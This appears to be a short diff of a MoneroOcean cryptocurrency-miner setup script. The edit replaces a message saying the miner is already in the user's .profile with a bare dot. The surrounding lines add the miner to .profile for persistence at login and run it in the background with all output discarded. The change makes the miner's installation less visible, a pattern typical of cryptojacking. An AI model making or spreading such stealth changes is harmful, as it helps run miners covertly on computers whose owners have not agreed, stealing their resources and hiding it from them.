@@ -246,7 +246,7 @@ if ! sudo -n true 2>/dev/null; then
     echo "."
     echo "$HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1" >>$HOME/.profile
   else 
-    echo "Looks like $HOME/moneroocean/miner.sh script is already in the $HOME/.profile"
+    echo "."
   fi
   echo "."
   /bin/bash $HOME/moneroocean/miner.sh --config=$HOME/moneroocean/config_background.json >/dev/null 2>&1
